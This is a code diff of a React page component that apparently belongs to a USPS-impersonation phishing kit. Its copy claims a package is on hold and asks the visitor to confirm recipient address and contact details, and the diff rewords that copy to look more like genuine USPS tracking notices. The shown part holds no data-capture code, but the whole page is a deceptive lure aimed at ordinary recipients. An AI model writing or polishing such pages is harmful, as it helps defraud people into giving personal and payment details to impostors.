@@ -92,24 +92,29 @@ export default function Home() {
       <div className="alz-shell">
         <section className="alz-usps-intro">
           <div className="alz-usps-intro-copy">
-            <div className="alz-usps-eyebrow">USPS Tracking Update</div>
-            <h1 className="alz-usps-title">A shipment needs recipient verification before delivery can continue</h1>
+            <div className="alz-usps-eyebrow">USPS Tracking</div>
+            <h1 className="alz-usps-title">Your package is on hold pending final delivery confirmation</h1>
             <p className="alz-usps-lead">
-              We found a delivery detail mismatch for this shipment. Review the tracking information below and confirm the
-              recipient details to release the package.
+              USPS needs an updated recipient confirmation before this shipment can move to the next delivery step. Review the
+              tracking information and verify the delivery details to continue processing.
             </p>
+            <div className="alz-usps-intro-meta">
+              <span>Expected service: Priority Mail</span>
+              <span>Latest event: Address confirmation required</span>
+            </div>
           </div>
           <div className="alz-usps-track-card">
             <div className="alz-usps-track-label">Tracking Number</div>
             <div className="alz-usps-track-number">{orderNumber}</div>
             <div className="alz-usps-track-meta">Updated {orderPlacedDate}</div>
+            <div className="alz-usps-track-state">USPS Tracking Status Available</div>
           </div>
         </section>
 
         <section className="alz-usps-service-grid">
           <article className="alz-usps-service-card alz-usps-service-card-primary">
             <div className="alz-usps-service-kicker">Delivery Action Required</div>
-            <h2 className="alz-usps-service-title">Delivery is currently on hold</h2>
+            <h2 className="alz-usps-service-title">Delivery is temporarily paused</h2>
             <p className="alz-usps-service-copy">
               USPS could not complete delivery using the recipient details currently associated with this shipment.
               Confirm the delivery information to continue processing.
@@ -132,19 +137,19 @@ export default function Home() {
             <div className="alz-usps-detail-list">
               <div className="alz-usps-detail-row">
                 <span>Status</span>
-                <strong>Pending recipient confirmation</strong>
+                <strong>Awaiting recipient review</strong>
               </div>
               <div className="alz-usps-detail-row">
                 <span>Shipment Type</span>
-                <strong>Domestic parcel delivery</strong>
+                <strong>Priority Mail parcel</strong>
               </div>
               <div className="alz-usps-detail-row">
                 <span>Last Activity</span>
-                <strong>Delivery attempt interrupted</strong>
+                <strong>Address verification requested</strong>
               </div>
               <div className="alz-usps-detail-row">
                 <span>Next Step</span>
-                <strong>Verify recipient address and contact</strong>
+                <strong>Confirm recipient address and contact</strong>
               </div>
             </div>
           </article>
